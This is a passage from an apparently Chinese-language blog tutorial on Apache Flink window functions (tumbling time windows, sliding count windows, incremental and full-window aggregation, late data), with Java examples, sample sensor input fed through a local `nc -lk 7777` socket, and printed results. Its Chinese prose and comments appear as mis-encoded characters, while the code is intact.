</span></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Integer <span class="title">add</span><span class="params">(SensorReading value, Integer accumulator)</span> </span>&#123;</span><br><span class="line">          <span class="keyword">return</span> accumulator + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è¿”å›ç»“æœå€¼</span></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Integer <span class="title">getResult</span><span class="params">(Integer accumulator)</span> </span>&#123;</span><br><span class="line">          <span class="keyword">return</span> accumulator;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// åˆ†åŒºåˆå¹¶ç»“æœ(TimeWindowä¸€èˆ¬ç”¨ä¸åˆ°ï¼ŒSessionWindowå¯èƒ½éœ€è¦è€ƒè™‘åˆå¹¶)</span></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Integer <span class="title">merge</span><span class="params">(Integer a, Integer b)</span> </span>&#123;</span><br><span class="line">          <span class="keyword">return</span> a + b;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;);</span><br><span class="line"></span><br><span class="line">    resultStream.print(<span class="string">&quot;result&quot;</span>);</span><br><span class="line"></span><br><span class="line">    env.execute();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p> æœ¬åœ°å¼€å¯socketæœåŠ¡  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lk 7777</span><br></pre></td></tr></table></figure></li><li><p>å¯åŠ¨Flinkç¨‹åºï¼Œåœ¨socketçª—å£è¾“å…¥æ•°æ® </p><ul><li><p> è¾“å…¥(ä¸‹é¢ç”¨â€œæ¢è¡Œâ€åŒºåˆ†æ¯ä¸ª15så†…çš„è¾“å…¥ï¼Œå®é™…è¾“å…¥æ—¶æ— æ¢è¡Œ)  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sensor_1,1547718199,35.8</span><br><span class="line">sensor_6,1547718201,15.4</span><br><span class="line"></span><br><span class="line">sensor_7,1547718202,6.7</span><br><span class="line">sensor_10,1547718205,38.1</span><br><span class="line">sensor_1,1547718207,36.3</span><br><span class="line">sensor_1,1547718209,32.8</span><br><span class="line"></span><br><span class="line">sensor_1,1547718212,37.1</span><br></pre></td></tr></table></figure></li><li><p> è¾“å‡ºï¼ˆä¸‹é¢ç”¨â€œæ¢è¡Œâ€åŒºåˆ†æ¯ä¸ª15så†…çš„è¾“å‡ºï¼Œå®é™…è¾“å‡ºæ— æ¢è¡Œï¼‰<br><em>å› ä¸ºä»£ç å®ç°æ¯15sä¸€ä¸ªwindowï¼Œæ‰€ä»¥â€sensor_1â€ä¸­é—´ä¸€ç»„æ‰ç´¯è®¡2ï¼Œæœ€åˆä¸€æ¬¡ä¸ç´¯è®¡ï¼Œæœ€åä¸€æ¬¡ä¹Ÿæ˜¯å¦å¤–çš„windowï¼Œé‡æ–°ä»1è®¡æ•°ã€‚</em>  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">result&gt; 1</span><br><span class="line">result&gt; 1</span><br><span class="line"></span><br><span class="line">result&gt; 1</span><br><span class="line">result&gt; 1</span><br><span class="line">result&gt; 2</span><br><span class="line"></span><br><span class="line">result&gt; 1</span><br></pre></td></tr></table></figure></li></ul></li></ul><ol start="2"><li> æµ‹è¯•æ»šåŠ¨æ—¶é—´çª—å£çš„<strong>å…¨çª—å£å‡½æ•°</strong><br>å…¨çª—å£å‡½æ•°ï¼Œç‰¹ç‚¹å³æ•°æ®è¿‡æ¥å…ˆä¸å¤„ç†ï¼Œç­‰åˆ°çª—å£ä¸´ç•Œå†éå†ã€è®¡ç®—ã€è¾“å‡ºç»“æœã€‚ </li></ol><ul><li><p> ç¼–å†™javaæµ‹è¯•ä»£ç   </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> apitest.window;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> apitest.beans.SensorReading;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.IteratorUtils;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.functions.AggregateFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.java.tuple.Tuple;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.java.tuple.Tuple3;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.SingleOutputStreamOperator;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.windowing.WindowFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.assigners.TumblingProcessingTimeWindows;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.time.Time;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.windows.TimeWindow;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.util.Collector;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/1 7:14 PM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WindowTest1_TimeWindow</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// åˆ›å»ºæ‰§è¡Œç¯å¢ƒ</span></span><br><span class="line">        StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å¹¶è¡Œåº¦è®¾ç½®1ï¼Œæ–¹ä¾¿çœ‹ç»“æœ</span></span><br><span class="line">        env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        // ä»æ–‡ä»¶è¯»å–æ•°æ®</span></span><br><span class="line"><span class="comment">//        DataStream&lt;String&gt; dataStream = env.readTextFile(&quot;/tmp/Flink_Tutorial/src/main/resources/sensor.txt&quot;);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// ä»socketæ–‡æœ¬æµè·å–æ•°æ®</span></span><br><span class="line">        DataStream&lt;String&gt; inputStream = env.socketTextStream(<span class="string">&quot;localhost&quot;</span>, <span class="number">7777</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è½¬æ¢æˆSensorReadingç±»å‹</span></span><br><span class="line">        DataStream&lt;SensorReading&gt; dataStream = inputStream.map(line -&gt; &#123;</span><br><span class="line">            String[] fields = line.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> SensorReading(fields[<span class="number">0</span>], <span class="keyword">new</span> Long(fields[<span class="number">1</span>]), <span class="keyword">new</span> Double(fields[<span class="number">2</span>]));</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. å…¨çª—å£å‡½æ•° ï¼ˆWindowFunctionå’ŒProcessWindowFunctionï¼Œåè€…æ›´å…¨é¢ï¼‰</span></span><br><span class="line">        SingleOutputStreamOperator&lt;Tuple3&lt;String, Long, Integer&gt;&gt; resultStream2 = dataStream.keyBy(SensorReading::getId)</span><br><span class="line">                .window(TumblingProcessingTimeWindows.of(Time.seconds(<span class="number">15</span>)))</span><br><span class="line"><span class="comment">//                .process(new ProcessWindowFunction&lt;SensorReading, Object, Tuple, TimeWindow&gt;() &#123;</span></span><br><span class="line"><span class="comment">//                &#125;)</span></span><br><span class="line">                .apply(<span class="keyword">new</span> WindowFunction&lt;SensorReading, Tuple3&lt;String, Long, Integer&gt;, String, TimeWindow&gt;() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">apply</span><span class="params">(String s, TimeWindow window, Iterable&lt;SensorReading&gt; input, Collector&lt;Tuple3&lt;String, Long, Integer&gt;&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                        String id = s;</span><br><span class="line">                        <span class="keyword">long</span> windowEnd = window.getEnd();</span><br><span class="line">                        <span class="keyword">int</span> count = IteratorUtils.toList(input.iterator()).size();</span><br><span class="line">                        out.collect(<span class="keyword">new</span> Tuple3&lt;&gt;(id, windowEnd, count));</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;);</span><br><span class="line"></span><br><span class="line">        resultStream2.print(<span class="string">&quot;result2&quot;</span>);</span><br><span class="line"></span><br><span class="line">        env.execute();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p> å¯åŠ¨æœ¬åœ°socket  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lk 7777</span><br></pre></td></tr></table></figure></li><li><p>åœ¨æœ¬åœ°socketè¾“å…¥ï¼ŒæŸ¥çœ‹Flinkè¾“å‡ºç»“æœ </p><ul><li><p> è¾“å…¥ï¼ˆä»¥â€œç©ºè¡Œâ€è¡¨ç¤ºæ¯ä¸ª15sæ—¶é—´çª—å£å†…çš„è¾“å…¥ï¼Œå®é™…æ²¡æœ‰â€œç©ºè¡Œâ€ï¼‰  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sensor_1,1547718199,35.8</span><br><span class="line">sensor_6,1547718201,15.4</span><br><span class="line"></span><br><span class="line">sensor_7,1547718202,6.7</span><br><span class="line">sensor_10,1547718205,38.1</span><br><span class="line">sensor_1,1547718207,36.3</span><br><span class="line">sensor_1,1547718209,32.8</span><br></pre></td></tr></table></figure></li><li><p> è¾“å‡ºï¼ˆä»¥â€œç©ºè¡Œâ€è¡¨ç¤ºæ¯ä¸ª15sæ—¶é—´çª—å£å†…çš„è¾“å…¥ï¼Œå®é™…æ²¡æœ‰â€œç©ºè¡Œâ€ï¼‰<br><em>è¿™é‡Œæ¯ä¸ªwindowéƒ½æ˜¯åˆ†å¼€è®¡ç®—çš„ï¼Œæ‰€ä»¥ç¬¬ä¸€ä¸ªwindowé‡Œçš„sensor_1å’Œç¬¬äºŒä¸ªwindowé‡Œçš„sensor_1å¹¶æ²¡æœ‰ç´¯è®¡ã€‚</em>  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">result2&gt; (sensor_1,1612190820000,1)</span><br><span class="line">result2&gt; (sensor_6,1612190820000,1)</span><br><span class="line"></span><br><span class="line">result2&gt; (sensor_7,1612190835000,1)</span><br><span class="line">result2&gt; (sensor_1,1612190835000,2)</span><br><span class="line">result2&gt; (sensor_10,1612190835000,1)</span><br></pre></td></tr></table></figure></li></ul></li></ul><ol start="3"><li> æµ‹è¯•æ»‘åŠ¨è®¡æ•°çª—å£çš„<strong>å¢é‡èšåˆå‡½æ•°</strong><br>æ»‘åŠ¨çª—å£ï¼Œå½“çª—å£ä¸è¶³è®¾ç½®çš„å¤§å°æ—¶ï¼Œä¼šå…ˆæŒ‰ç…§æ­¥é•¿è¾“å‡ºã€‚<br>egï¼šçª—å£å¤§å°10ï¼Œæ­¥é•¿2ï¼Œé‚£ä¹ˆå‰5æ¬¡è¾“å‡ºæ—¶ï¼Œçª—å£å†…çš„å…ƒç´ ä¸ªæ•°åˆ†åˆ«æ˜¯ï¼ˆ2ï¼Œ4ï¼Œ6ï¼Œ8ï¼Œ10ï¼‰ï¼Œå†å¾€åå°±æ˜¯10ä¸ªä¸ºä¸€ä¸ªçª—å£äº†ã€‚ </li></ol><ul><li><p> ç¼–å†™javaä»£ç ï¼š<br>è¿™é‡Œè·å–æ¯ä¸ªçª—å£é‡Œçš„æ¸©åº¦å¹³å‡å€¼  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> apitest.window;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> apitest.beans.SensorReading;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.functions.AggregateFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.java.tuple.Tuple2;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/1 11:03 PM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WindowTest2_CountWindow</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// åˆ›å»ºæ‰§è¡Œç¯å¢ƒ</span></span><br><span class="line">    StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å¹¶è¡Œåº¦è®¾ç½®1ï¼Œæ–¹ä¾¿çœ‹ç»“æœ</span></span><br><span class="line">    env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä»socketæ–‡æœ¬æµè·å–æ•°æ®</span></span><br><span class="line">    DataStream&lt;String&gt; inputStream = env.socketTextStream(<span class="string">&quot;localhost&quot;</span>, <span class="number">7777</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è½¬æ¢æˆSensorReadingç±»å‹</span></span><br><span class="line">    DataStream&lt;SensorReading&gt; dataStream = inputStream.map(line -&gt; &#123;</span><br><span class="line">      String[] fields = line.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> SensorReading(fields[<span class="number">0</span>], <span class="keyword">new</span> Long(fields[<span class="number">1</span>]), <span class="keyword">new</span> Double(fields[<span class="number">2</span>]));</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    DataStream&lt;Double&gt; resultStream = dataStream.keyBy(SensorReading::getId)</span><br><span class="line">      .countWindow(<span class="number">10</span>, <span class="number">2</span>)</span><br><span class="line">      .aggregate(<span class="keyword">new</span> MyAvgFunc());</span><br><span class="line"></span><br><span class="line">    resultStream.print(<span class="string">&quot;result&quot;</span>);</span><br><span class="line"></span><br><span class="line">    env.execute();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">MyAvgFunc</span> <span class="keyword">implements</span> <span class="title">AggregateFunction</span>&lt;<span class="title">SensorReading</span>, <span class="title">Tuple2</span>&lt;<span class="title">Double</span>, <span class="title">Integer</span>&gt;, <span class="title">Double</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Tuple2&lt;Double, Integer&gt; <span class="title">createAccumulator</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> Tuple2&lt;&gt;(<span class="number">0.0</span>, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Tuple2&lt;Double, Integer&gt; <span class="title">add</span><span class="params">(SensorReading value, Tuple2&lt;Double, Integer&gt; accumulator)</span> </span>&#123;</span><br><span class="line">      <span class="comment">// æ¸©åº¦ç´¯åŠ æ±‚å’Œï¼Œå½“å‰ç»Ÿè®¡çš„æ¸©åº¦ä¸ªæ•°+1</span></span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> Tuple2&lt;&gt;(accumulator.f0 + value.getTemperature(), accumulator.f1 + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Double <span class="title">getResult</span><span class="params">(Tuple2&lt;Double, Integer&gt; accumulator)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> accumulator.f0 / accumulator.f1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Tuple2&lt;Double, Integer&gt; <span class="title">merge</span><span class="params">(Tuple2&lt;Double, Integer&gt; a, Tuple2&lt;Double, Integer&gt; b)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> Tuple2&lt;&gt;(a.f0 + b.f0, a.f1 + b.f1);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p> å¯åŠ¨socketæœåŠ¡  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lk 7777</span><br></pre></td></tr></table></figure></li><li><p>æœ¬åœ°socketè¾“å…¥ï¼ŒFlinkæ§åˆ¶å°æŸ¥çœ‹è¾“å‡ºç»“æœ </p><ul><li><p> è¾“å…¥<br>è¿™é‡Œä¸ºäº†æ–¹ä¾¿ï¼Œå°±åªè¾“å…¥åŒä¸€ä¸ªkeyByç»„çš„æ•°æ®<code>sensor_1</code>  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">sensor_1,1547718199,1</span><br><span class="line">sensor_1,1547718199,2</span><br><span class="line">sensor_1,1547718199,3</span><br><span class="line">sensor_1,1547718199,4</span><br><span class="line">sensor_1,1547718199,5</span><br><span class="line">sensor_1,1547718199,6</span><br><span class="line">sensor_1,1547718199,7</span><br><span class="line">sensor_1,1547718199,8</span><br><span class="line">sensor_1,1547718199,9</span><br><span class="line">sensor_1,1547718199,10</span><br><span class="line">sensor_1,1547718199,11</span><br><span class="line">sensor_1,1547718199,12</span><br><span class="line">sensor_1,1547718199,13</span><br><span class="line">sensor_1,1547718199,14</span><br></pre></td></tr></table></figure></li><li><p> è¾“å‡º<br>è¾“å…¥æ—¶ï¼Œä¼šå‘ç°ï¼Œæ¯æ¬¡åˆ°è¾¾ä¸€ä¸ªçª—å£æ­¥é•¿ï¼ˆè¿™é‡Œä¸º2ï¼‰ï¼Œå°±ä¼šè®¡ç®—å¾—å‡ºä¸€æ¬¡ç»“æœã€‚<br>ç¬¬ä¸€æ¬¡è®¡ç®—å‰2ä¸ªæ•°çš„å¹³å‡å€¼<br>ç¬¬äºŒæ¬¡è®¡ç®—å‰4ä¸ªæ•°çš„å¹³å‡å€¼<br>ç¬¬ä¸‰æ¬¡è®¡ç®—å‰6ä¸ªæ•°çš„å¹³å‡å€¼<br>ç¬¬å››æ¬¡è®¡ç®—å‰8ä¸ªæ•°çš„å¹³å‡å€¼<br>ç¬¬äº”æ¬¡è®¡ç®—å‰10ä¸ªæ•°çš„å¹³å‡å€¼</p></li></ul></li></ul><p><strong>ç¬¬å…­æ¬¡è®¡ç®—å‰æœ€è¿‘10ä¸ªæ•°çš„å¹³å‡å€¼</strong><br><strong>ç¬¬ä¸ƒæ¬¡è®¡ç®—å‰æœ€è¿‘10ä¸ªæ•°çš„å¹³å‡å€¼</strong>  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">result&gt; 1.5</span><br><span class="line">result&gt; 2.5</span><br><span class="line">result&gt; 3.5</span><br><span class="line">result&gt; 4.5</span><br><span class="line">result&gt; 5.5</span><br><span class="line">result&gt; 7.5</span><br><span class="line">result&gt; 9.5</span><br></pre></td></tr></table></figure><ol start="4"><li> å…¶ä»–å¯é€‰APIä»£ç ç‰‡æ®µ  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 3. å…¶ä»–å¯é€‰API</span></span><br><span class="line">OutputTag&lt;SensorReading&gt; outputTag = <span class="keyword">new</span> OutputTag&lt;SensorReading&gt;(<span class="string">&quot;late&quot;</span>) &#123;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">SingleOutputStreamOperator&lt;SensorReading&gt; sumStream = dataStream.keyBy(<span class="string">&quot;id&quot;</span>)</span><br><span class="line">  .timeWindow(Time.seconds(<span class="number">15</span>))</span><br><span class="line">  <span class="comment">//                .trigger() // è§¦å‘å™¨ï¼Œä¸€èˆ¬ä¸ä½¿ç”¨ </span></span><br><span class="line">  <span class="comment">//                .evictor() // ç§»é™¤å™¨ï¼Œä¸€èˆ¬ä¸ä½¿ç”¨</span></span><br><span class="line">  .allowedLateness(Time.minutes(<span class="number">1</span>)) <span class="comment">// å…è®¸1åˆ†é’Ÿå†…çš„è¿Ÿåˆ°æ•°æ®&lt;=æ¯”å¦‚æ•°æ®äº§ç”Ÿæ—¶é—´åœ¨çª—å£èŒƒå›´å†…ï¼Œä½†æ˜¯è¦å¤„ç†çš„æ—¶å€™å·²ç»è¶…è¿‡çª—å£æ—¶é—´äº†</span></span><br><span class="line">  .sideOutputLateData(outputTag) <span class="comment">// ä¾§è¾“å‡ºæµï¼Œè¿Ÿåˆ°è¶…è¿‡1åˆ†é’Ÿçš„æ•°æ®ï¼Œæ”¶é›†äºæ­¤</span></span><br><span class="line">  .sum(<span class="string">&quot;temperature&quot;</span>); <span class="comment">// ä¾§è¾“å‡ºæµ å¯¹ æ¸©åº¦ä¿¡æ¯ æ±‚å’Œã€‚</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ä¹‹åå¯ä»¥å†ç”¨åˆ«çš„ç¨‹åºï¼ŒæŠŠä¾§è¾“å‡ºæµçš„ä¿¡æ¯å’Œå‰é¢çª—å£çš„ä¿¡æ¯èšåˆã€‚ï¼ˆå¯ä»¥æŠŠä¾§è¾“å‡ºæµç†è§£ä¸ºç”¨æ¥æ‰¹å¤„ç†æ¥è¡¥æ•‘å¤„ç†è¶…æ—¶æ•°æ®ï¼‰</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="æ—¶é—´è¯­ä¹‰å’ŒWatermark"><a href="#æ—¶é—´è¯­ä¹‰å’ŒWatermark" class="headerlink" title="æ—¶é—´è¯­ä¹‰å’ŒWatermark"></a>æ—¶é—´è¯­ä¹‰å’ŒWatermark</h3><blockquote><p><a href="https://blog.csdn.net/dongkang123456/article/details/108374799">Flink_Window</a></p></blockquote><h4 id="Flinkä¸­çš„æ—¶é—´è¯­ä¹‰"><a href="#Flinkä¸­çš„æ—¶é—´è¯­ä¹‰" class="headerlink" title="Flinkä¸­çš„æ—¶é—´è¯­ä¹‰"></a>Flinkä¸­çš„æ—¶é—´è¯­ä¹‰</h4><p><img src="https://img-blog.csdnimg.cn/20200903145920356.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RvbmdrYW5nMTIzNDU2,size_16,color_FFFFFF,t_70###pic_center###id=E48vI&originHeight=337&originWidth=798&originalType=binary&ratio=1&status=done&style=none"></p><ul><li> <strong>Event Timeï¼šäº‹ä»¶åˆ›å»ºæ—¶é—´ï¼›</strong> </li><li> Ingestion Timeï¼šæ•°æ®è¿›å…¥Flinkçš„æ—¶é—´ï¼› </li><li> Processing Timeï¼šæ‰§è¡Œæ“ä½œç®—å­çš„æœ¬åœ°ç³»ç»Ÿæ—¶é—´ï¼Œä¸æœºå™¨ç›¸å…³ï¼› </li></ul><pre><code>_Event Timeæ˜¯äº‹ä»¶åˆ›å»ºçš„æ—¶é—´ã€‚å®ƒé€šå¸¸ç”±äº‹ä»¶ä¸­çš„æ—¶é—´æˆ³æè¿°ï¼Œä¾‹å¦‚é‡‡é›†çš„æ—¥å¿—æ•°æ®ä¸­ï¼Œæ¯ä¸€æ¡æ—¥å¿—éƒ½ä¼šè®°å½•è‡ªå·±çš„ç”Ÿæˆæ—¶é—´ï¼ŒFlinké€šè¿‡æ—¶é—´æˆ³åˆ†é…å™¨è®¿é—®äº‹ä»¶æ—¶é—´æˆ³ã€‚_</code></pre><hr><blockquote><p><a href="https://blog.csdn.net/qq_40180229/article/details/106363815">Flink-æ—¶é—´è¯­ä¹‰ä¸WartmarkåŠEventTimeåœ¨Windowä¸­çš„ä½¿ç”¨</a></p></blockquote><p><img 